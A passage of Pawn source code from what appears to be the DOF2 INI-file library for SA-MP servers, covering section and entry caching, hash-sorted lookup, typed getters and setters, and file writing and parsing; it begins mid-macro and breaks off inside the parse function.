	    return __OnParseFile_%0_%1 (extraid, (value [0] == '\1' && value [1] == '\0') ? ("""") : value); \
	stock __OnParseFile_%0_%1 (%2)

// Also here: The argument names may be arbitrary but must be an integer followed by 4 strings.
// Function must return a value.
#define OnDefaultParseFile(%0) \
	forward _OnDefaultParseFile (extraid, value [], key [], tag [], file []); \
	public _OnDefaultParseFile (extraid, value [], key [], tag [], file []) \
	    return __OnDefaultParseFile (extraid, (value [0] == '\1' && value [1] == '\0') ? ("""") : value, key, (tag [0] == '\1' && tag [1] == '\0') ? ("""") : tag, file); \
	stock __OnDefaultParseFile (%0)

#define DOF2_ParseBool() \
	(strval (value) || (value [0] && !strcmp (value, ""true"", true)))

#define DOF2_ParseInt() \
	(strval (value))

#define DOF2_ParseFloat() \
	(floatstr (value))

#define DOF2_ParseBin() \
	(DOF2_strbin (value))

#define DOF2_ParseHex() \
	(DOF2_strhex (value))

#define DOF2_LoadFile() \
	DOF2_ParseFile (CurrentFile, -1, false)

#define DOF2_SaveFile \
	DOF2_WriteFile

#define DOF2_FileExists \
	fexist

#define Sections. \
	Sections_

#define Entries. \
	Entries_

#define DOF2:: \
	DOF2_
	
#if !defined private
	#define private 		static stock
#endif
	
#pragma dynamic 65536

/*
#define MAX_SECTION_TAG        (32)
#define MAX_LINE_SIZE       (128)
#define MAX_SECTIONS            (32)
#define MAX_ENTRIES         (256)
#define MAX_FILE_SIZE       (64)

#define USER_FILE_PATH 		""Users/%s.ini""
*/

// The maximum length of the name of a tag.
#if !defined MAX_SECTION_TAG
	#define MAX_SECTION_TAG    	(32)
#endif

// The maximum length of a line (including key and value).
#if !defined MAX_LINE_SIZE
	#define MAX_LINE_SIZE       (150)
#endif

// The maximum number of sections which can be handled. Be careful: MUST NOT be higher than 255.
#if !defined MAX_SECTIONS
	#define MAX_SECTIONS       	(32)
#endif

// The maximum number of entries which can be loaded into the cache.
#if !defined MAX_ENTRIES
	#define MAX_ENTRIES         (256)
#endif

// The maximum length of the name of a file.
#if !defined MAX_FILE_SIZE
	#define MAX_FILE_SIZE       (64)
#endif

/*
If PACK_CONTENT == true tag names and lines (key + value) will get stored in cache as packed strings.
The result is less memory usage. However, you won't be able to use special characters like russian or chinese ones.
*/
#if !defined PACK_CONTENT
	#define PACK_CONTENT        (false)
#endif

#define INVALID_ENTRY           (-1)
#define INVALID_SECTION         (-1)

// Do you want to emulate DUDB?
#if !defined DUDB_CONVERT && 0 // Change to 1 to enable.
	#define DUDB_CONVERT
#endif

#if !defined USER_FILE_PATH
	#if defined DUDB_CONVERT
		#define USER_FILE_PATH 	""%s.dudb.sav""
	#else
	    #define USER_FILE_PATH 	""%s.ini""
	#endif
#endif

#if !defined USER_PW_HASH_KEY
    #if defined DUDB_CONVERT
		#define USER_PW_HASH_KEY ""password_hash""
	#else
	    #define USER_PW_HASH_KEY ""password""
	#endif
#endif
	

// Do you want to emulate DINI?
#if !defined DINI_CONVERT && 1 // Change to 1 to enable.
	#define DINI_CONVERT
#endif

/*
#if MAX_SECTIONS >= 256
	#error MAX_SECTIONS must not be greater than 255.
#endif
*/

/*-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=*/

private
	bool: UseUTF8 = PACK_CONTENT,
	bool: CaseSensitive = false,
	CurrentFile [MAX_FILE_SIZE],
	bool: FileChanged,
	Sections.FirstEntry [MAX_SECTIONS] = {INVALID_ENTRY, ...},
	Sections.LastEntry [MAX_SECTIONS] = {INVALID_ENTRY, ...},
	Sections.Count,
#if PACK_CONTENT == true
	Sections.Tag [MAX_SECTIONS][MAX_SECTION_TAG char],
	Entries.Line [MAX_ENTRIES][MAX_LINE_SIZE char],
	Entries.Tag [MAX_ENTRIES][MAX_SECTION_TAG char],
#else
	Sections.Tag [MAX_SECTIONS][MAX_SECTION_TAG],
    Entries.Line [MAX_ENTRIES][MAX_LINE_SIZE],
	Entries.Tag [MAX_ENTRIES][MAX_SECTION_TAG],
#endif
#if MAX_SECTIONS >= 256
	Entries.Section [MAX_ENTRIES],
#else
	Entries.Section [MAX_ENTRIES char],
#endif
	Entries.NextEntry [MAX_ENTRIES] = {INVALID_ENTRY, ...},
	Entries.PreviousEntry [MAX_ENTRIES] = {INVALID_ENTRY, ...},
	Entries.Count,
	SortedEntryList [MAX_ENTRIES][2]; // Index 0: Hashcode, Index 1: EntryID

/*-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=*/

DOF2::Exit ()
	DOF2::WriteFile ();

stock DOF2::SetUTF8 (bool: set)
	UseUTF8 = set;

stock bool: DOF2::GetUTF8 ()
	return UseUTF8;

stock bool: DOF2::SetCaseSensitivity (bool: set)
	CaseSensitive = set;
	
stock bool: DOF2::GetCaseSensitivity ()
	return CaseSensitive;

stock DOF2::SetFile (const file [])
	DOF2::strcpy (CurrentFile, file);

stock DOF2::GetFile ()
	return CurrentFile;

stock DOF2::CreateFile (const file [], const password [] = """")
{
	if (!DOF2::FileExists (file))
	{
        new File: f = fopen (file, io_append);
        
		if (fclose (f))
		{
			if (password [0])
		    	return DOF2::SetInt (file, USER_PW_HASH_KEY, DOF2::num_hash (password));
			return 1;
		}
	}
	return 0;
}

stock DOF2::RenameFile (oldfile [], newfile [])
{
	if (!DOF2::FileExists (newfile))
	{
	    // If 'CurrentFile' is 'oldfile', write it if it has been changed.
		if (CurrentFile [0] && !strcmp (CurrentFile, oldfile) && FileChanged)
			DOF2::WriteFile ();
		else if (!DOF2::ParseFile (oldfile, -1, false)) // Otherwise parse 'oldfile'.
		    return 0;
		    
		DOF2::SetFile (newfile);
		if (DOF2::WriteFile ())
		    return fremove (oldfile);
	}
	return 0;
}

stock DOF2::CopyFile (filetocopy [], newfile [])
{
    if (!DOF2::FileExists (newfile))
	{
	    if (CurrentFile [0] && !strcmp (CurrentFile, filetocopy) && FileChanged)
			DOF2::WriteFile ();
		else if(!DOF2::ParseFile (filetocopy, -1, false))
		    return 0;
		    
		DOF2::SetFile (newfile);
		return DOF2::WriteFile ();
	}
	return 0;
}

stock DOF2::RemoveFile (const file [])
{
	if (file [0])
	{
	    if (CurrentFile [0] && !strcmp (CurrentFile, file))
	        CurrentFile [0] = '\0';
		return fremove (file);
	}
	return 0;
}

stock DOF2::MakeBackup (file [])
{
    new
        year,
		month,
		day,
		hour,
		minute,
		second,
		backupfile [MAX_FILE_SIZE];

    getdate (year, month, day);
    gettime (hour, minute, second);
    format (backupfile, sizeof (backupfile), ""%s.%02d_%02d_%02d.%02d_%02d_%02d_%02d.bak"", CurrentFile, month, day, year, hour, minute, second, GetTickCount ());
    return DOF2::CopyFile (CurrentFile, backupfile);
}

stock bool: DOF2::SectionExists (file [], tag [])
{
    if (file [0]) // You can't remove the empty Sections.
	{
	    if (!tag [0])
	        return true; // Emptry section always exists. In every file.

        if (!CurrentFile [0] || strcmp (CurrentFile, file)) // No file in buffer or the file you want to read from is not the file in the buffer.
	    	if (!DOF2::ParseFile (file, -1, false))
	    	    return false;

	#if PACK_CONTENT == true
		new buf [MAX_SECTION_TAG];
	#endif
	
    	for (new i = 1; i < Sections.Count; ++i)
    	{
    	#if PACK_CONTENT == true
    	    strunpack (buf, Sections.Tag [i]);
	        if (!strcmp (buf, tag, !CaseSensitive))
		        return true;
		#else
		    if (!strcmp (Sections.Tag [i], tag, !CaseSensitive))
		        return true;
		#endif
    	}
	}
	return false;
}

stock DOF2::RemoveSection (file [], tag [])
{
	// Removes tag 'tag' with all it's entries.
	if (file [0] && tag [0]) // You can't remove the empty Sections.
	{
    	if (!CurrentFile [0] || strcmp (CurrentFile, file)) // No file in buffer or the file you want to read from is not the file in the buffer.
	    	if (!DOF2::ParseFile (file, -1, false))
	    	    return 0;

		new
		#if PACK_CONTENT == true
		    line [MAX_LINE_SIZE],
		    buf [MAX_SECTION_TAG],
		#endif
			section = INVALID_SECTION,
			entry,
			key [MAX_KEY_SIZE];

	    for (new i = 1; i < Sections.Count; ++i)
	    {
		#if PACK_CONTENT == true
	        strunpack (buf, Sections.Tag [i]);
	        if (!strcmp (buf, tag, !CaseSensitive))
	        {
	            section = i;
	            break;
	        }
		#else
		    if (!strcmp (Sections.Tag [i], tag, !CaseSensitive))
	        {
	            section = i;
	            break;
	        }
		#endif
	    }

		if (section != INVALID_SECTION)
		{
			entry = Sections.FirstEntry [section];
			while (entry != INVALID_ENTRY)
			{
			    // Remove all entries under the current Sections.
		    #if PACK_CONTENT == true
		    	strunpack (line, Entries.Line [entry]);
			    DOF2::ParseLine (line, key, buf);
			#else
			    DOF2::ParseLine (Entries.Line [entry], key, buf);
			#endif
			    DOF2::Unset (file, key, tag);
				entry = Entries.NextEntry [entry];
			}

		    // Move the last tag to the position of the current tag. Creates a little mess.
		    --Sections.Count;
		    Sections.Tag [section] = Sections.Tag [Sections.Count];
		    Sections.FirstEntry [section] = Sections.FirstEntry [Sections.Count];
		    Sections.LastEntry [section] = Sections.LastEntry [Sections.Count];

			// Adjust the tag IDs of the entries.
		    entry = Sections.FirstEntry [section];
		    while (entry != INVALID_ENTRY)
		    {
			#if MAX_SECTIONS >= 256
				Entries.Section [entry] = section;
			#else
		        Entries.Section {entry} = section;
			#endif
		        entry = Entries.NextEntry [entry];
		    }
		    FileChanged = true;
		    return 1;
		}
	}
	return 0;
}

private DOF2::SearchEntry (const key [], const tag [], keybuf [], valbuf [], &pos, keybufsize = sizeof (keybuf), valbufsize = sizeof (valbuf))
{
	if (key [0] && Entries.Count)
	{
	    new
	        entry = INVALID_ENTRY,
	        l,
	        m,
	        r,
	        h,
		#if PACK_CONTENT == true
	        line [MAX_LINE_SIZE],
	        buf [MAX_SECTION_TAG],
		#endif
	        i;

        h = DOF2::HashKey (key);
		l = 0;
		r = Entries.Count - 1;

		/*
		 * Binary search in a sorted list of entries in O(log n) time. This algorithm makes for example with 256 elements a maximum of ~8 steps until the entry is found if it exists.
		 * A sequential search would take up to 256 steps. That was the case in the first Double-O-Files script.
		 */
		while (l <= r)
		{
		    if ((r - l) < 2)
		    {
		        if (h == SortedEntryList [l][0])
		        {
		            m = l;
			        entry = SortedEntryList [l][1];
				}
				else if (r > l && h == SortedEntryList [r][0])
				{
				    m = r;
				    entry = SortedEntryList [r][1];
				}
		        break;
		    }
		    else
		    {
		        m = l + (r - l) / 2;
			    if (h == SortedEntryList [m][0])
			    {
			        entry = SortedEntryList [m][1];
			        break;
			    }
			    else if (h > SortedEntryList [m][0])
					l = m + 1;
				else
				    r = m - 1;
			}
		}

		// Candidate found?
		if (entry != INVALID_ENTRY)
		{
			// Check if it's the entry we want.
  		#if PACK_CONTENT == true
			strunpack (line, Entries.Line [entry]);
			DOF2::ParseLine (line, keybuf, valbuf, keybufsize, valbufsize);
		    strunpack (buf, Entries.Tag [entry]);
			if (!strcmp (keybuf, key, !CaseSensitive) && ((!tag [0] && !buf [0]) || (tag [0] && buf [0] && !strcmp (tag, buf, !CaseSensitive))))
		#else
			DOF2::ParseLine (Entries.Line [entry], keybuf, valbuf, keybufsize, valbufsize);
		    if (!strcmp (keybuf, key, !CaseSensitive) && ((!tag [0] && !Entries.Tag [entry][0]) || (tag [0] && Entries.Tag [entry][0] && !strcmp (tag, Entries.Tag [entry], !CaseSensitive))))
		#endif
			    return (pos = m, entry);
			else
			{
			    // If not, look left and right in the list for entries with the same hash code. This can be collisions or entries with the same key from another section.
			    for (i = m - 1; i >= 0 && h == SortedEntryList [i][0]; --i)
			    {
			        entry = SortedEntryList [i][1];
			 	#if PACK_CONTENT == true
					strunpack (line, Entries.Line [entry]);
					DOF2::ParseLine (line, keybuf, valbuf, keybufsize, valbufsize);
				    strunpack (buf, Entries.Tag [entry]);
					if (!strcmp (keybuf, key, !CaseSensitive) && ((!tag [0] && !buf [0]) || (tag [0] && buf [0] && !strcmp (tag, buf, !CaseSensitive))))
				#else
					DOF2::ParseLine (Entries.Line [entry], keybuf, valbuf, keybufsize, valbufsize);
				    if (!strcmp (keybuf, key, !CaseSensitive) && ((!tag [0] && !Entries.Tag [entry][0]) || (tag [0] && Entries.Tag [entry][0] && !strcmp (tag, Entries.Tag [entry], !CaseSensitive))))
				#endif
					    return (pos = i, entry);
			    }

			    for (i = m + 1; i < Entries.Count && h == SortedEntryList [i][0]; ++i)
			    {
			        entry = SortedEntryList [i][1];
			 	#if PACK_CONTENT == true
					strunpack (line, Entries.Line [entry]);
					DOF2::ParseLine (line, keybuf, valbuf, keybufsize, valbufsize);
				    strunpack (buf, Entries.Tag [entry]);
					if (!strcmp (keybuf, key, !CaseSensitive) && ((!tag [0] && !buf [0]) || (tag [0] && buf [0] && !strcmp (tag, buf, !CaseSensitive))))
				#else
					DOF2::ParseLine (Entries.Line [entry], keybuf, valbuf, keybufsize, valbufsize);
				    if (!strcmp (keybuf, key, !CaseSensitive) && ((!tag [0] && !Entries.Tag [entry][0]) || (tag [0] && Entries.Tag [entry][0] && !strcmp (tag, Entries.Tag [entry], !CaseSensitive))))
				#endif
					    return (pos = i, entry);
			    }
			}
		}
	}
	
	keybuf [0] = valbuf [0] = '\0';
	return INVALID_ENTRY;
}

stock DOF2::SetString (const file [], const key [], const value [], const tag [] = """")
{
    if (file [0] && key [0])
	{
	    new
	        entry,
	        pos,
	        section = INVALID_SECTION,
	        keybuf [MAX_LINE_SIZE],
	        valbuf [MAX_LINE_SIZE],
		#if PACK_CONTENT == true
	        buf [MAX_SECTION_TAG],
	        line [MAX_LINE_SIZE],
		#endif
			i;

        if (!CurrentFile [0] || strcmp (CurrentFile, file)) // No file in buffer or the file you want to read from is not the file in the buffer.
	    	if (!DOF2::ParseFile (file, -1, false))
	    	    return 0;

        entry = DOF2::SearchEntry (key, tag, keybuf, valbuf, pos);

        // If the entry has been found, just change it's content.
        if (entry != INVALID_ENTRY)
		{
		    FileChanged = true;
		#if PACK_CONTENT == true
			format (line, sizeof (line), ""%s = %s"", key, value [0] ? value : (""(null)""));
		    return strpack (Entries.Line [entry], line);
		#else
			format (Entries.Line [entry], sizeof (Entries.Line []), ""%s = %s"", key, value [0] ? value : (""(null)""));
			return 1;
		#endif
        }

		if (Entries.Count >= MAX_ENTRIES)
		    return 0;

		// Search for the section where the entry belongs.
		if (!tag [0])
		    section = 0;
		else
		{
			for (i = 1; i < Sections.Count; ++i)
			{
			#if PACK_CONTENT == true
			    strunpack (buf, Sections.Tag [i]);
			    if (buf [0] && !strcmp (tag, buf, !CaseSensitive))
			    {
			        section = i;
			        break;
			    }
			#else
			    if (Sections.Tag [i][0] && !strcmp (tag, Sections.Tag [i], !CaseSensitive))
			    {
			        section = i;
			        break;
			    }
			#endif
			}
		}

		// Section we want does not exist, create new one if possible.
		if (section == INVALID_SECTION)
		{
		    if (Sections.Count >= MAX_SECTIONS)
		        return 0;

		    section = Sections.Count++;
	    #if PACK_CONTENT == true
			strpack (Sections.Tag [section], tag);
		#else
		    DOF2::strcpy (Sections.Tag [section], tag);
		#endif
			Sections.FirstEntry [section] = Sections.LastEntry [section] = INVALID_ENTRY;
		}

		// Add the entry to the section. Section's content is defined by a linear two way list.
	#if PACK_CONTENT == true
		format (line, sizeof (line), ""%s = %s"", key, value [0] ? value : (""(null)""));
		strpack (Entries.Line [Entries.Count], line);
	#else
	    format (Entries.Line [Entries.Count], sizeof (Entries.Line []), ""%s = %s"", key, value [0] ? value : (""(null)""));
	#endif
		Entries.Tag [Entries.Count] = Sections.Tag [section];
    #if MAX_SECTIONS >= 256
		Entries.Section [Entries.Count] = section;
	#else
	    Entries.Section {Entries.Count} = section;
	#endif
		Entries.NextEntry [Entries.Count] = INVALID_ENTRY;

		// Add entry to sorted list of entries and move to right correct position in O(n) time.
		SortedEntryList [Entries.Count][0] = DOF2::HashKey (key);
		SortedEntryList [Entries.Count][1] = Entries.Count;
		i = Entries.Count - 1;
		while (i >= 0 && SortedEntryList [i][0] > SortedEntryList [i + 1][0])
		{
		    DOF2::SwapSortedEntries (SortedEntryList [i], SortedEntryList [i + 1]);
		    --i;
		}

		if (Sections.LastEntry [section] == INVALID_ENTRY) // No entry in this section.
		{
		    Sections.FirstEntry [section] = Sections.LastEntry [section] = Entries.Count;
		    Entries.PreviousEntry [Entries.Count] = INVALID_ENTRY;
		}
		else
		{
			Entries.NextEntry [Sections.LastEntry [section]] = Entries.Count;
			Entries.PreviousEntry [Entries.Count] = Sections.LastEntry [section];
			Sections.LastEntry [section] = Entries.Count;
		}
		++Entries.Count;
		FileChanged = true;
	}
	DOF2_SaveFile();
	return 1;
}

stock DOF2::GetString (const file [], const key [], const tag [] = """")
{
	new buf [MAX_LINE_SIZE];
	DOF2::GetStringEx (file, key, buf, sizeof (buf), tag);
	return buf;
}

stock DOF2::GetStringEx (const file [], const key [], result [], size, const tag [] = """")
{
	if (file [0] && key [0])
	{
	    new
	        pos,
			keybuf [MAX_LINE_SIZE];

        if (!CurrentFile [0] || strcmp (CurrentFile, file))
        {
	    	if (!DOF2::ParseFile (file, -1, false))
	    	{
	    	    result [0] = '\0';
	    	    return 0;
			}
		}

		// Find entry and assign the result with it's value.
		return (DOF2::SearchEntry (key, tag, keybuf, result, pos, sizeof (keybuf), size) != INVALID_ENTRY);
	}
	return 0;
}

stock DOF2::Unset (file [], key [], tag [] = """")
{
	if (file [0] && key [0])
	{
	    new
	        entry,
	        pos,
			keybuf [MAX_LINE_SIZE],
			valbuf [MAX_LINE_SIZE];

		if (!CurrentFile [0] || strcmp (CurrentFile, file))
	    	if (!DOF2::ParseFile (file, -1, false))
	    	    return 0;

		if ((entry = DOF2::SearchEntry (key, tag, keybuf, valbuf, pos)) != INVALID_ENTRY)
		{
		    // Remove entry from it's section.
        #if MAX_SECTIONS >= 256
		    if (Sections.FirstEntry [Entries.Section [entry]] == entry) // Is the entry the first entry in the section? Make it's next entry the first entry.
		#else
		    if (Sections.FirstEntry [Entries.Section {entry}] == entry)
		#endif
			{
			#if MAX_SECTIONS >= 256
		        Sections.FirstEntry [Entries.Section [entry]] = Entries.NextEntry [entry];
			#else
			    Sections.FirstEntry [Entries.Section {entry}] = Entries.NextEntry [entry];
			#endif
		        if (Entries.NextEntry [entry] != INVALID_ENTRY)
					Entries.PreviousEntry [Entries.NextEntry [entry]] = INVALID_ENTRY;
			}
			else
			{
			    Entries.NextEntry [Entries.PreviousEntry [entry]] = Entries.NextEntry [entry];
			    if (Entries.NextEntry [entry] != INVALID_ENTRY)
					Entries.PreviousEntry [Entries.NextEntry [entry]] = Entries.PreviousEntry [entry];
			}

        #if MAX_SECTIONS >= 256
            if (Sections.LastEntry [Entries.Section [entry]] == entry)
        #else
			if (Sections.LastEntry [Entries.Section {entry}] == entry)
		#endif
			{
			#if MAX_SECTIONS >= 256
			    Sections.LastEntry [Entries.Section [entry]] = Entries.PreviousEntry [entry];
			#else
			    Sections.LastEntry [Entries.Section {entry}] = Entries.PreviousEntry [entry];
			#endif
			    if (Entries.PreviousEntry [entry] != INVALID_ENTRY)
			        Entries.NextEntry [Entries.PreviousEntry [entry]] = INVALID_ENTRY;
			}
			else
			{
			    Entries.PreviousEntry [Entries.NextEntry [entry]] = Entries.PreviousEntry [entry];
			    if (Entries.PreviousEntry [entry] != INVALID_ENTRY)
			        Entries.NextEntry [Entries.PreviousEntry [entry]] = Entries.NextEntry [entry];
			}

			// Move the entry to the end of the sorted list and decrement Entries.Count to forget about the unset Entries.
			while (pos < (Entries.Count - 1))
			{
			    DOF2::SwapSortedEntries (SortedEntryList [pos], SortedEntryList [pos + 1]);
			    ++pos;
			}
			--Entries.Count;
			FileChanged = true;
		    return 1;
		}
	}
	return 0;
}

stock DOF2::RenameKey (file [], oldkey [], newkey [], tag [] = """")
{
	if (file [0] && oldkey [0])
	{
	    new
	        entry,
	        pos,
		#if PACK_CONTENT == true
			line [MAX_LINE_SIZE],
		#endif
			keybuf [MAX_LINE_SIZE],
			valbuf [MAX_LINE_SIZE];

		if (!CurrentFile [0] || strcmp (CurrentFile, file))
	    	if (!DOF2::ParseFile (file, -1, false))
	    	    return 0;

		if ((entry = DOF2::SearchEntry (oldkey, tag, keybuf, valbuf, pos)) != INVALID_ENTRY)
		{
		    // Change content of Entries.
		#if PACK_CONTENT == true
            format (line, sizeof (line), ""%s = %s"", newkey, valbuf [0] ? valbuf : (""(null)""));
		    strpack (Entries.Line [entry], line);
		#else
            format (Entries.Line [entry], sizeof (Entries.Line []), ""%s = %s"", newkey, valbuf [0] ? valbuf : (""(null)""));
		#endif

		    // Because the hashcode has been changed, the entry has to move in the list.
		    SortedEntryList [pos][0] = DOF2::HashKey (newkey);
		    if (pos < (MAX_ENTRIES - 1) && SortedEntryList [pos][0] > SortedEntryList [pos + 1][0])
		    {
				// Hash value of key is greater than the hash value of it's right neighbor, move to the right by swapping the 2 entries.
				while (pos < (MAX_ENTRIES - 1) && SortedEntryList [pos][0] > SortedEntryList [pos + 1][0])
				{
				    DOF2::SwapSortedEntries (SortedEntryList [pos], SortedEntryList [pos + 1]);
				    ++pos;
				}
		    }
		    else if (pos > 0 && SortedEntryList [pos][0] < SortedEntryList [pos + 1][0])
		    {
		        // Hash value of key is smaller than the hash value of it' left neighbor, move to the left by swapping the 2 entries.
		        while (pos > 0 && SortedEntryList [pos][0] < SortedEntryList [pos - 1][0])
		        {
		            DOF2::SwapSortedEntries (SortedEntryList [pos], SortedEntryList [pos - 1]);
		            --pos;
		        }
		    }

			FileChanged = true;
		    return 1;
		}
	}
	return 0;
}

stock bool: DOF2::IsSet (file [], key [], tag [] = """")
{
	new
	    pos,
		keybuf [MAX_LINE_SIZE],
		valbuf [MAX_LINE_SIZE];

	if (!CurrentFile [0] || strcmp (CurrentFile, file))
		if (!DOF2::ParseFile (file, -1, false))
		    return false;

	// Try to find the Entries.
	return (DOF2::SearchEntry (key, tag, keybuf, valbuf, pos) != INVALID_ENTRY);
}

stock DOF2::SetInt (const file [], const key [], value, const tag [] = """")
{
	new buf [16];
	format (buf, sizeof (buf), ""%d"", value);
	return DOF2::SetString (file, key, buf, tag);
}

stock DOF2::GetInt (const file [], const key [], const tag [] = """")
{
	new buf [16];
	DOF2::GetStringEx (file, key, buf, sizeof (buf), tag);
	return strval (buf);
}

stock DOF2::SetHex (file [], key [], value, tag [] = """")
{
	new buf [16];
	DOF2::hexstr (value, buf);
	return DOF2::SetString (file, key, buf, tag);
}

stock DOF2::GetHex (file [], key [], tag [] = """")
{
	new buf [16];
	DOF2::GetStringEx (file, key, buf, sizeof (buf), tag);
	return DOF2::strhex (buf);
}

stock DOF2::SetBin (file [], key [], value, tag [] = """")
{
	new buf [35];
	DOF2::binstr (value, buf);
	return DOF2::SetString (file, key, buf, tag);
}

stock DOF2::GetBin (file [], key [], tag [] = """")
{
	new buf [35];
	DOF2::GetStringEx (file, key, buf, sizeof (buf), tag);
	return DOF2::strbin (buf);
}

stock DOF2::SetFloat (const file [], const key [], Float: value, const tag [] = """")
{
	new buf [32];
	format (buf, sizeof (buf), ""%.8f"", value);
	return DOF2::SetString (file, key, buf, tag);
}

stock Float: DOF2::GetFloat (const file [], const key [], const tag [] = """")
{
	new buf [32];
	DOF2::GetStringEx (file, key, buf, sizeof (buf), tag);
	return floatstr (buf);
}

stock bool: DOF2::GetBool (const file [], const key [], const tag [] = """")
{
	new buf [16];
	DOF2::GetStringEx (file, key, buf, sizeof (buf), tag);
	return (strval (buf) || (buf [0] && !strcmp (buf, ""true"", true)));
}

stock DOF2::SetBool (const file [], const key [], bool: value, const tag [] = """")
	return DOF2::SetString (file, key, value ? (""true"") : (""false""), tag);
	
/*-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=*/

stock DOF2::PrintFile (comment [] = """")
{
    if (CurrentFile [0])
	{
		new
			bool: firstline = true,
			entry,
		#if PACK_CONTENT == true
			buf [MAX_LINE_SIZE],
		#endif
			entries,
			i;

	    printf (""[DOF] Current file: %s"", CurrentFile);
		for ( ; i < Sections.Count; ++i)
		{
		    if (i)
			{
			    if (!firstline)
					print ("" "");
				else
				    firstline = false;
			#if PACK_CONTENT == true
				strunpack (buf, Sections.Tag [i]);
				printf (""[%s]"", buf);
			#else
			    printf (""[%s]"", Sections.Tag [i]);
			#endif
			}
			entry = Sections.FirstEntry [i];
			while (entry != INVALID_ENTRY)
			{
			#if PACK_CONTENT == true
				strunpack (buf, Entries.Line [entry]);
				print (buf);
			#else
			    print (Entries.Line [entry]);
			#endif
			    entry = Entries.NextEntry [entry];
			    firstline = false;
			    ++entries;
			}
		}
		printf (""* %d sections, %d entries"", i, entries);
		if (comment [0])
			printf (""* Comment: %s"", comment);
		return 1;
	}
	return 0;
}

stock DOF2::WriteFile ()
{
	if (CurrentFile [0])
	{
		new
			File: f = fopen (CurrentFile, io_write),
			bool: firstline = true,
			entry;

		if (f)
		{
			for (new i; i < Sections.Count; ++i)
			{
			    if (Sections.FirstEntry [i] != INVALID_ENTRY) // Do not write when empty.
			    {
				    if (i)
					{
					    if (!firstline)
						{
							fputchar (f, '\r', UseUTF8);
							fputchar (f, '\n', UseUTF8);
						}
						else
						    firstline = false;
						fputchar (f, '[', UseUTF8);
						fwritechars (f, Sections.Tag [i]);
						fputchar (f, ']', UseUTF8);
						fputchar (f, '\r', UseUTF8);
						fputchar (f, '\n', UseUTF8);
					}

					entry = Sections.FirstEntry [i];
					while (entry != INVALID_ENTRY)
					{
					    fwritechars (f, Entries.Line [entry]);
					    fputchar (f, '\r', UseUTF8);
					    fputchar (f, '\n', UseUTF8);
					    entry = Entries.NextEntry [entry];
					    firstline = false;
					}
				}
			}
			FileChanged = false;
			return fclose (f);
		}
	}
	return 0;
}

stock DOF2::ParseFile (const file [], extraid = -1, bool: callback = false)
{
    if (file [0] && DOF2::FileExists (file))
	{
	    /*
	    Write the file in the buffer when:
	    - There is actually a file in the buffer
	    - The file in the buffer is not the file you want to parse and this file has been changed.
	    - Or the current file is the file you want to and has been changed.
	    */
	    //if (CurrentFile [0] && ((strcmp (CurrentFile, file) && FileChanged) || FileChanged))
	    if (CurrentFile [0] && FileChanged) // Equal to the query above but shorter.
	    	DOF2::WriteFile ();

		new
			File: f = fopen (file, io_readwrite),
		    buf [MAX_LINE_SIZE],
		#if PACK_CONTENT == true
		    line [MAX_LINE_SIZE char],
		    tag [MAX_SECTION_TAG],
		#else
		    line [MAX_LINE_SIZE],
		#endif
		    key [MAX_LINE_SIZE],
		    value [MAX_LINE_SIZE],
			c,
			pos;

		if (f)
		{
			FileChanged = false;
            DOF2::SetFile (file);

			Sections.Count = 1;
			Entries.Count = 0;
			Sections.FirstEntry [0] = Sections.LastEntry [0] = INVALID_ENTRY;

			for (new i, size = flength (f); i < size; ++i)
			{
			    c = fgetchar (f, false);
				//c = fgetchar (f, 0, UseUTF8);
				if (pos == MAX_LINE_SIZE - 1 || c == '\n' || c == '\r')
				    c = '\0';
			#if PACK_CONTENT == true
				line {pos++} = c;
			#else
			    line [pos++] = c;
			#endif

				if (c == '\0')
				{
				    // A new section found. Add the section to the list of sections.
				#if PACK_CONTENT == true
				    if (line {0} == '[')
				#else
                	if (line [0] == '[')
				#endif
				    {
				        if (Sections.Count < MAX_SECTIONS)
				        {
							pos = 1;
						#if PACK_CONTENT == true
							while (line {pos} && line {pos} != ']' && (pos - 1) < MAX_SECTION_TAG)
							{
								Sections.Tag [Sections.Count]{pos - 1} = line {pos};
								++pos;
							}
							Sections.Tag [Sections.Count]{pos - 1} = '\0';
						#else
						    while (line [pos] && line [pos] != ']' && (pos - 1) < MAX_SECTION_TAG)
							{
								Sections.Tag [Sections.Count][pos - 1] = line [pos];
								++pos;
							}
							Sections.Tag [Sections.Count][pos - 1] = '\0';
						#endif
							Sections.FirstEntry [Sections.Count] = Sections.LastEntry [Sections.Count] = INVALID_ENTRY;
							++Sections.Count;
					    }
				    }
				    else
				    {
					#if PACK_CONTENT == true
				        if (line {0})
					#else
					    if (line [0])
					#endif
				        {
				        #if PACK_CONTENT == true
							strunpack (buf, line);
					        DOF2::ParseLine (buf, key, value);
					        strunpack (tag, Sections.Tag [Sections.Count - 1]);

							// Call a specific function for a specific entry - ZCMD-style!
					        if (callback)
					        {
						        format (buf, sizeof (buf), ""_OnParseFile_%s_%s"", tag, key);
						        if (!CallRemoteFunction (buf, ""is"", extraid, value))
									CallRemoteFunction (""_OnDefaultParseFile"", ""issss"", extraid, value [0] ? value : (""\1""), key, Sections.Tag [Sections.Count - 1][0] ? Sections.Tag [Sections.Count - 1] : (""\1""), file);
							}
						#else
					        DOF2::ParseLine (line, key, value);

							// Call a specific function for a specific entry - ZCMD-style!
					        if (callback)
					        {
						        format (buf, sizeof (buf), ""_OnParseFile_%s_%s"", Sections.Tag [Sections.Count - 1], key);
						        if (!CallRemoteFunction (buf, ""is"", extraid, value))
									CallRemoteFunction (""_OnDefaultParseFile"", ""issss"", extraid, value [0] ? value : (""\1""), key, Sections.Tag [Sections.Count - 1][0] ? Sections.Tag [Sections.Count - 1] : (""\1""), file);
							}
						#endif

							// Add entry to it's section and to the list which will be sorted.
							Entries.Line [Entries.Count] = line;
							Entries.Tag [Entries.Count] = Sections.Tag [Sections.Count - 1];
                        #if MAX_SECTIONS >= 256
							Entries.Section [Entries.Count] = Sections.Count - 1;
						#else
							Entries.Section {Entries.Count} = Sections.Count - 1;
						#endif
							Entries.NextEntry [Entries.Count] = INVALID_ENTRY;

							SortedEntryList [Entries.Count][0] = DOF2::HashKey (key);
							SortedEntryList [Entries.Count][1] = Entries.Count;

							if (Sections.LastEntry [Sections.Count - 1] == INVALID_ENTRY)
							{
